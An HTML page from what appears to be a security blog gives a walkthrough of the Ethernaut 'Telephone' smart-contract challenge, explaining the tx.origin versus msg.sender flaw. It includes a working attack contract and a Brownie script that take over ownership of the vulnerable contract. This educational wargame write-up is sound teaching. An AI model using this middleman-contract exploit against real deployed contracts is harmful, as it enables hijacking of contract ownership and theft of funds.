@@ -1,0 +1,345 @@
+<!DOCTYPE html>
+<html lang="en" itemscope itemtype="http://schema.org/WebPage">
+<head>
+  <meta charset="utf-8" />
+
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+
+  <link rel="icon" href="/favicon.ico">
+
+  <title>
+    Ethernaut - Level 04 - Telephone - Security Pills
+  </title>
+
+  <meta name="description" content="Image courtesy of OpenZeppelin
+Ethernaut 04 - Telephone This level from Ethernaut, called Telephone, is a good exercise to learn the nuances between tx.origin and msg.sender and why you should never use tx.origin for authentication purposes:
+// SPDX-License-Identifier: MIT pragma solidity ^0.6.0; contract Telephone { address public owner; constructor() public { owner = msg.sender; } function changeOwner(address _owner) public { if (tx.origin != msg.sender) { owner = _owner; } } } Solidity has a global variable, tx." /><meta name="generator" content="Hugo 0.101.0" />
+
+  <link rel="stylesheet" href="https://securitypills.github.io/css/main.css" />
+
+  
+  
+
+  <meta property="og:title" content="Ethernaut - Level 04 - Telephone" />
+<meta property="og:description" content="Image courtesy of OpenZeppelin
+Ethernaut 04 - Telephone This level from Ethernaut, called Telephone, is a good exercise to learn the nuances between tx.origin and msg.sender and why you should never use tx.origin for authentication purposes:
+// SPDX-License-Identifier: MIT pragma solidity ^0.6.0; contract Telephone { address public owner; constructor() public { owner = msg.sender; } function changeOwner(address _owner) public { if (tx.origin != msg.sender) { owner = _owner; } } } Solidity has a global variable, tx." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://securitypills.github.io/articles/ethernaut-4-telephone/" /><meta property="article:section" content="articles" />
+<meta property="article:published_time" content="2022-08-24T00:00:00+00:00" />
+<meta property="article:modified_time" content="2022-08-24T00:00:00+00:00" />
+
+
+
+  <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Ethernaut - Level 04 - Telephone"/>
+<meta name="twitter:description" content="Image courtesy of OpenZeppelin
+Ethernaut 04 - Telephone This level from Ethernaut, called Telephone, is a good exercise to learn the nuances between tx.origin and msg.sender and why you should never use tx.origin for authentication purposes:
+// SPDX-License-Identifier: MIT pragma solidity ^0.6.0; contract Telephone { address public owner; constructor() public { owner = msg.sender; } function changeOwner(address _owner) public { if (tx.origin != msg.sender) { owner = _owner; } } } Solidity has a global variable, tx."/>
+
+
+  <meta itemprop="name" content="Ethernaut - Level 04 - Telephone">
+<meta itemprop="description" content="Image courtesy of OpenZeppelin
+Ethernaut 04 - Telephone This level from Ethernaut, called Telephone, is a good exercise to learn the nuances between tx.origin and msg.sender and why you should never use tx.origin for authentication purposes:
+// SPDX-License-Identifier: MIT pragma solidity ^0.6.0; contract Telephone { address public owner; constructor() public { owner = msg.sender; } function changeOwner(address _owner) public { if (tx.origin != msg.sender) { owner = _owner; } } } Solidity has a global variable, tx."><meta itemprop="datePublished" content="2022-08-24T00:00:00+00:00" />
+<meta itemprop="dateModified" content="2022-08-24T00:00:00+00:00" />
+<meta itemprop="wordCount" content="648">
+<meta itemprop="keywords" content="" />
+
+  <meta itemprop="name" content="Ethernaut - Level 04 - Telephone">
+<meta itemprop="description" content="Image courtesy of OpenZeppelin
+Ethernaut 04 - Telephone This level from Ethernaut, called Telephone, is a good exercise to learn the nuances between tx.origin and msg.sender and why you should never use tx.origin for authentication purposes:
+// SPDX-License-Identifier: MIT pragma solidity ^0.6.0; contract Telephone { address public owner; constructor() public { owner = msg.sender; } function changeOwner(address _owner) public { if (tx.origin != msg.sender) { owner = _owner; } } } Solidity has a global variable, tx."><meta itemprop="datePublished" content="2022-08-24T00:00:00+00:00" />
+<meta itemprop="dateModified" content="2022-08-24T00:00:00+00:00" />
+<meta itemprop="wordCount" content="648">
+<meta itemprop="keywords" content="" />
+</head><body class="flex relative h-full min-h-screen"><aside
+  class="will-change-transform transform transition-transform -translate-x-full absolute top-0 left-0 md:relative md:translate-x-0 w-3/4 md:w-60 h-full min-h-screen p-3 bg-slate-50 dark:bg-slate-800 border-r border-slate-200 dark:border-slate-700 flex flex-col gap-2.5 z-20 sidebar">
+  <p class="font-bold mb-5 flex items-center gap-2">
+    <button
+      aria-label="Close sidebar"
+      class="md:hidden menu-trigger-close p-1 rounded text-slate-800 dark:text-slate-50 hover:bg-slate-200 dark:hover:bg-slate-700"><svg class="h-6 w-6" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor"
+  fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" />
+  <line x1="18" y1="6" x2="6" y2="18" />
+  <line x1="6" y1="6" x2="18" y2="18" />
+</svg></button>
+    <a href="https://securitypills.github.io/" class="px-2">
+    <span>Security Pills</span>
+    
+    </a>
+    
+    <button
+      aria-label="Toggle dark mode"
+      class="dark-mode-toggle p-2 rounded border dark:border-slate-700 hover:bg-slate-200 dark:hover:bg-slate-700"><svg class="h-4 w-4" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor"
+  fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" />
+  <circle cx="12" cy="12" r="4" />
+  <path d="M3 12h1M12 3v1M20 12h1M12 20v1M5.6 5.6l.7 .7M18.4 5.6l-.7 .7M17.7 17.7l.7 .7M6.3 17.7l-.7 .7" />
+</svg></button>
+  
+  </p>
+
+  
+  <ul class="list-none flex flex-col gap-1">
+    
+    <li>
+      <a class="px-2 py-1.5 rounded-md text-sm flex items-center justify-between  hover:bg-slate-200 dark:hover:bg-slate-700 "
+        href="/" >
+        <span>Home</span>
+        
+      </a>
+    </li>
+    
+    <li>
+      <a class="px-2 py-1.5 rounded-md text-sm flex items-center justify-between  hover:bg-slate-200 dark:hover:bg-slate-700 "
+        href="/articles" >
+        <span>Blog</span>
+        
+      </a>
+    </li>
+    
+    <li>
+      <a class="px-2 py-1.5 rounded-md text-sm flex items-center justify-between  hover:bg-slate-200 dark:hover:bg-slate-700 "
+        href="/portfolio" >
+        <span>Newsletter</span>
+        
+      </a>
+    </li>
+    
+  </ul>
+
+  <div class="flex-1"></div>
+
+  <div class="revue-widget">
+  <form action="https://embeds.beehiiv.com/3645f86f-e3bb-46cb-adec-b3b2f20c9411?slim=true" method="post" name="revue-form" target="_blank">
+    <div class="text-bold text-sm">Subscribe to my newsletter</div>
+    
+    <p class="text-xs my-1 text-slate-500">A weekly newsletter for smart and curious people interested in security, technology, and smartcontracts</p>
+    
+    <div class="mt-2">
+      <input type="email" class="w-full px-1.5 py-0.5 text-sm rounded border dark:border-slate-700 dark:bg-slate-600" name="member[email]" id="member_email" placeholder="Your email address...">
+      <input type="submit" class="mt-2 w-full text-center text-sm bg-slate-800 text-white dark:bg-slate-50 dark:text-slate-800 py-1 rounded" name="member[subscribe]" id="member_submit" value="Subscribe">
+    </div>
+  </form>
+</div>
+
+  <ul class="list-none flex flex-wrap justify-center gap-1 pt-2 border-t border-slate-200 dark:border-slate-600">
+    
+  </ul>
+</aside>
+
+<div
+  class="fixed bg-slate-700 bg-opacity-5 transition duration-200 ease-in-out inset-0 z-10 pointer-events-auto md:hidden left-0 top-0 w-full h-full hidden menu-overlay">
+</div>
+
+<button
+  aria-label="Toggle Sidebar"
+  class="md:hidden absolute top-3 left-3 z-10 menu-trigger p-1 rounded text-slate-800 dark:text-slate-50 hover:bg-slate-100"><svg class="h-6 w-6" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor"
+  fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" />
+  <line x1="4" y1="6" x2="20" y2="6" />
+  <line x1="4" y1="12" x2="20" y2="12" />
+  <line x1="4" y1="18" x2="16" y2="18" />
+</svg></button><div class="flex-1">
+
+
+
+<div class="flex h-screen relative">
+
+  <section
+    class="will-change-transform transform transition-transform -translate-x-[200%] absolute top-0 left-0 lg:relative
+  lg:translate-x-0 lg:min-w-[400px] lg:w-1/4 h-full bg-slate-50 dark:bg-slate-800 border-r border-slate-200 dark:border-slate-700 lg:flex flex-col py-3 overflow-y-auto scroll-area">
+    
+    
+    <a href="https://securitypills.github.io/articles/">
+      <h2 class="font-bold mb-5 py-1 pl-12 pr-3 md:px-3">Articles</h2>
+    </a>
+    <div class="space-y-2.5">
+      
+      <a class="block px-3 py-4  bg-slate-900 dark:bg-slate-700 text-slate-50 "
+        href="/articles/ethernaut-4-telephone/">
+        
+        
+        <h3 class="text-lg font-semibold mb-0.5">Ethernaut - Level 04 - Telephone</h3>
+        <div
+          class="text-sm  text-slate-400  line-clamp-2">
+          Image courtesy of OpenZeppelin
+Ethernaut 04 - Telephone This level from Ethernaut, called Telephone, is a good exercise to learn the nuances between tx.origin and msg.sender and why you should never use tx.origin for authentication purposes:
+// SPDX-License-Identifier: MIT pragma solidity ^0.6.0; contract Telephone { address public owner; constructor() public { owner = msg.sender; } function changeOwner(address _owner) public { if (tx.origin != msg.sender) { owner = _owner; } } } Solidity has a global variable, tx.
+        </div>
+      </a>
+      
+      <a class="block px-3 py-4  hover:bg-slate-200 dark:hover:bg-slate-700 "
+        href="/articles/ethernaut-3-coinflip/">
+        
+        
+        <h3 class="text-lg font-semibold mb-0.5">Ethernaut - Level 03 - Coinflip</h3>
+        <div
+          class="text-sm  text-slate-500 dark:text-slate-400  line-clamp-2">
+          Image courtesy of OpenZeppelin
+Ethernaut 03 - Coinflip The third level in Ethernaut, CoinFlip, is a good exercise that will teach you how to exploit pseudo randomness implementations in smart contracts. This contract will require you to correctly guess the outcome of a coin flip ten times in a row:
+// SPDX-License-Identifier: MIT pragma solidity ^0.6.0; import &#39;@openzeppelin/contracts/math/SafeMath.sol&#39;; contract CoinFlip { using SafeMath for uint256; uint256 public consecutiveWins; uint256 lastHash; uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968; constructor() public { consecutiveWins = 0; } function flip(bool _guess) public returns (bool) { uint256 blockValue = uint256(blockhash(block.
+        </div>
+      </a>
+      
+      <a class="block px-3 py-4  hover:bg-slate-200 dark:hover:bg-slate-700 "
+        href="/articles/ethernaut/">
+        
+        
+        <h3 class="text-lg font-semibold mb-0.5">Ethernaut Challenges</h3>
+        <div
+          class="text-sm  text-slate-500 dark:text-slate-400  line-clamp-2">
+          Please read This is a work in progress article that will receive updates as we continue publishing detailed walkthroughs for each level.
+Ethernaut is OpenZeppelin Web3/Solidity based wargame to learn about Ethereum smart contract security and become familiar with programming principles in Solidity.
+Although the game was launched few years ago it has become a good place to start for those who are interested on security and smart contracts.
+Challenges are currently running on the Rinkeby testnet and you will require to use a Rinkey Faucet to get free testnet ETH and test the smart contracts.
+        </div>
+      </a>
+      
+      <a class="block px-3 py-4  hover:bg-slate-200 dark:hover:bg-slate-700 "
+        href="/articles/ethernaut-1-fallback/">
+        
+        
+        <h3 class="text-lg font-semibold mb-0.5">Ethernaut - Level 01 - Fallback</h3>
+        <div
+          class="text-sm  text-slate-500 dark:text-slate-400  line-clamp-2">
+          Image courtesy of OpenZeppelin
+Ethernaut 01 - Fallback The first level from Ethernaut is pretty straightforward and we will use it to become familiar with some Solidity concepts and the Brownie framework that we will use to complete this challenge.
+The code for the smart contract that we must exploit is shown above:
+// SPDX-License-Identifier: MIT pragma solidity ^0.6.0; import &#39;@openzeppelin/contracts/math/SafeMath.sol&#39;; contract Fallback { using SafeMath for uint256; mapping(address =&gt; uint) public contributions; address payable public owner; constructor() public { owner = msg.
+        </div>
+      </a>
+      
+      <a class="block px-3 py-4  hover:bg-slate-200 dark:hover:bg-slate-700 "
+        href="/articles/ethernaut-2-fallout/">
+        
+        
+        <h3 class="text-lg font-semibold mb-0.5">Ethernaut - Level 02 - Fallout</h3>
+        <div
+          class="text-sm  text-slate-500 dark:text-slate-400  line-clamp-2">
+          Image courtesy of OpenZeppelin
+Ethernaut 02 - Fallout The goal for this level is to claim ownership of the contract, which has the following implementation:
+// SPDX-License-Identifier: MIT pragma solidity ^0.6.0; import &#39;@openzeppelin/contracts/math/SafeMath.sol&#39;; contract Fallout { using SafeMath for uint256; mapping (address =&gt; uint) allocations; address payable public owner; /* constructor */ function Fal1out() public payable { owner = msg.sender; allocations[owner] = msg.value; } modifier onlyOwner { require( msg.sender == owner, &#34;caller is not the owner&#34; ); _; } function allocate() public payable { allocations[msg.
+        </div>
+      </a>
+      </div>
+    </section>
+
+  <div class="overflow-y-auto h-screen w-full">
+    <article class="px-6 py-20 w-full mx-auto prose lg:prose-lg h-fit dark:prose-invert prose-img:mx-auto">
+
+      
+      <h1 class="!mb-2">Ethernaut - Level 04 - Telephone</h1>
+      
+      <p class="text-sm text-slate-500 !mb-8">August 24, 2022</p>
+      
+
+      
+
+      <figure><img src="../images/telephone-4.svg"
+         alt="Image courtesy of OpenZeppelin"/><figcaption>
+            <p>Image courtesy of OpenZeppelin</p>
+        </figcaption>
+</figure>
+
+<h2 id="ethernaut-04---telephone">Ethernaut 04 - Telephone</h2>
+<p>This level from Ethernaut, called Telephone, is a good exercise to learn the nuances between <code>tx.origin</code> and <code>msg.sender</code> and why you should never use <code>tx.origin</code> for authentication purposes:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#75715e">// SPDX-License-Identifier: MIT
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">pragma solidity</span> <span style="color:#f92672">^</span><span style="color:#ae81ff">0</span>.<span style="color:#ae81ff">6</span>.<span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">contract</span> <span style="color:#a6e22e">Telephone</span> {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">address</span> <span style="color:#66d9ef">public</span> owner;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">constructor</span>() <span style="color:#66d9ef">public</span> {
+</span></span><span style="display:flex;"><span>    owner <span style="color:#f92672">=</span> msg.sender;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">changeOwner</span>(<span style="color:#66d9ef">address</span> _owner) <span style="color:#66d9ef">public</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (tx.origin <span style="color:#f92672">!=</span> msg.sender) {
+</span></span><span style="display:flex;"><span>      owner <span style="color:#f92672">=</span> _owner;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Solidity has a global variable, <code>tx.origin</code>, which traverses the entire call stack and returns the address of the account that originally sent the transaction (or performed the call). Using this global variable for authentication in smart contracts leaves the contract vulnerable to phishing-like attacks, which is exactly what this level is about.</p>
+<p>According to Solidity’s documentation:</p>
+<blockquote>
+<p><code>tx.origin</code> holds the address of the sender of the transaction, while <code>msg.sender</code> holds the address of the sender of the message</p>
+</blockquote>
+<p>This means that <code>tx.origin</code> will refers to the address of an account that sent a transaction, and <code>msg.sender</code> refers to the address of an account or a smart contract that is directly calling a smart contract’s function.</p>
+<figure><img src="../images/txorigin-msgsender.png"
+         alt="Image courtesy of OpenZeppelin"/><figcaption>
+            <p>Image courtesy of OpenZeppelin</p>
+        </figcaption>
+</figure>
+
+<p>Based on the previous image, if <code>Account</code> calls <code>contract A</code> , and <code>contract A</code> calls <code>contract B</code>, in <code>contract B</code>, the value assigned to <code>msg.sender</code> will be <code>contract B</code> and the value assigned to <code>tx.origin</code> will be <code>Account</code>.</p>
+<h2 id="where-is-the-vulnerability">Where is the vulnerability?</h2>
+<p>The vulnerability in this contract is contained in the <code>changeOwner</code> function, as it uses <code>tx.origin</code> in the if statement before changing the contract’s owner:</p>
+<div class="highlight" lineos="table" lineofstart="1"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;display:grid;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span>  <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">changeOwner</span>(<span style="color:#66d9ef">address</span> _owner) <span style="color:#66d9ef">public</span> {
+</span></span><span style="display:flex; background-color:#3c3d38"><span>    <span style="color:#66d9ef">if</span> (tx.origin <span style="color:#f92672">!=</span> msg.sender) {
+</span></span><span style="display:flex;"><span>      owner <span style="color:#f92672">=</span> _owner;
+</span></span><span style="display:flex;"><span>    }
+</span></span></code></pre></div><p>We will pass this level if <code>tx.origin</code> differs from <code>msg.sender</code> . This can be achieved if <code>msg.sender</code> is whatever address that calls the <code>changeOwner</code> function and <code>tx.origin</code> is the address that originally started the transaction. In other words, we will use a malicious contract (<code>telephoneAttack.sol</code>) as middleman. Once we first call our <code>telephoneAttack.sol</code> contract, it will call the <code>Telephone.sol</code> instance. For the <code>Telephone.sol</code> contract, <code>tx.origin</code> will be our EOA’s (external owned account) address and <code>msg.sender</code> will be our <code>telephoneAttack.sol</code> contract’s address.</p>
+<p>A vulnerability like this, costed THORChain $8 million dollars, as Adrian Hetman documented in his <a href="https://www.adrianhetman.com/unboxing-tx-origin/"  target="_blank" rel="noopener" >Unboxing tx.origin: Rune Token case</a> article.</p>
+<h2 id="hacking-the-contract">Hacking the contract</h2>
+<p>Let&rsquo;s start creating our malicious contract, <code>telephoneAttack.sol</code>, with the following implementation:</p>
+<div class="highlight" lineos="table" lineofstart="1"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;display:grid;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#75715e">// SPDX-License-Identifier: MIT
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">pragma solidity</span> <span style="color:#f92672">^</span><span style="color:#ae81ff">0</span>.<span style="color:#ae81ff">6</span>.<span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> <span style="color:#e6db74">&#39;interfaces/telephoneInterface.sol&#39;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">contract</span> <span style="color:#a6e22e">TelephoneAttack</span> {
+</span></span><span style="display:flex;"><span>    TelephoneInterface telephone;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex; background-color:#3c3d38"><span>    <span style="color:#66d9ef">constructor</span>(<span style="color:#66d9ef">address</span> _attackerAddress) <span style="color:#66d9ef">public</span>{
+</span></span><span style="display:flex; background-color:#3c3d38"><span>        telephone <span style="color:#f92672">=</span> TelephoneInterface(_attackerAddress);
+</span></span><span style="display:flex; background-color:#3c3d38"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex; background-color:#3c3d38"><span>    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">exploit</span>() <span style="color:#66d9ef">public</span> {
+</span></span><span style="display:flex; background-color:#3c3d38"><span>        telephone.changeOwner(msg.sender);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">destroy</span>() <span style="color:#66d9ef">public</span> {
+</span></span><span style="display:flex;"><span>        selfdestruct(msg.sender);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>As always, the script to trigger the attack is shown below:</p>
+<div class="highlight" lineos="table" lineofstart="1"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;display:grid;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> brownie <span style="color:#f92672">import</span> accounts, config, interface, web3, TelephoneAttack
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">exploit</span>(target, hacker):
+</span></span><span style="display:flex; background-color:#3c3d38"><span>    deploy_attack <span style="color:#f92672">=</span> TelephoneAttack<span style="color:#f92672">.</span>deploy(target, {<span style="color:#e6db74">&#34;from&#34;</span>: hacker})
+</span></span><span style="display:flex; background-color:#3c3d38"><span>    deploy_attack<span style="color:#f92672">.</span>exploit({<span style="color:#e6db74">&#39;from&#39;</span>: hacker, <span style="color:#e6db74">&#39;allow_revert&#39;</span>: <span style="color:#66d9ef">True</span>})
+</span></span><span style="display:flex;"><span>    deploy_attack<span style="color:#f92672">.</span>destroy({<span style="color:#e6db74">&#39;from&#39;</span>: hacker})
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>(target):
+</span></span><span style="display:flex; background-color:#3c3d38"><span>    hacker <span style="color:#f92672">=</span> accounts<span style="color:#f92672">.</span>add(config[<span style="color:#e6db74">&#39;wallets&#39;</span>][<span style="color:#e6db74">&#39;from_key&#39;</span>])
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;Attacker address: </span><span style="color:#e6db74">{</span>hacker<span style="color:#e6db74">}</span><span style="color:#e6db74">, Target address: </span><span style="color:#e6db74">{</span>target<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
+</span></span><span style="display:flex;"><span>    exploit(target, hacker)
+</span></span></code></pre></div><p>Based on the explanation provided before the attack can be summarized in few steps:</p>
+<ul>
+<li>We start by deploying our malicious contract (<code>TelephoneAttack.deploy</code>), therefore, <code>tx.origin</code> will have the user&rsquo;s account address.</li>
+<li>The <code>TelephoneAattack</code> contract initializes an instance of <code>Telephone</code> within its <code>constructor</code> passing the <code>TelephoneAttack</code> contract&rsquo;s address as <code>msg.sender</code>.</li>
+<li>Our script will call <code>deploy_attack.exploit</code>, which executes the <code>exploit()</code> function and calls <code>telephone.changeOwner(msg.sender);</code>.</li>
+<li>As mentioned earlier in this walkthrough, the <code>tx.origin</code> is a global variable which traverses the entire call stack and returns the address of the account that originally sent the transaction, our user account, differing from the value assigned to <code>msg.sender</code> (Our <code>TelephonAttack</code> contract&rsquo;s address).</li>
+<li>As <code>tx.origin</code> differs from <code>msg.sender</code>, our exploit will pass the <code>if</code> statement and execute the <code>owner = _owner;</code> statement, assigning us as the contract&rsquo;s legitimate owner</li>
+</ul>
+<h2 id="takeaways">Takeaways</h2>
+<p>The most valuable takeaway from this challenge is to learn to do not use <code>tx.origin</code> for authorization purposes, additionally, by using <code>tx.origin</code> you are limiting interoperability between contracts, since contracts using <code>tx.origin</code> cannot be used by other contracts (<em>a contract can never be the <code>tx.origin</code></em>). Instead, you should use <code>msg.sender</code> for authorization.</p>
+
+    </article>
+  </div>
+
+</div>
+
+
+  </div>
+<script type="text/javascript" src="/main.js" defer></script>
+
+
+</body>
+
+</html>
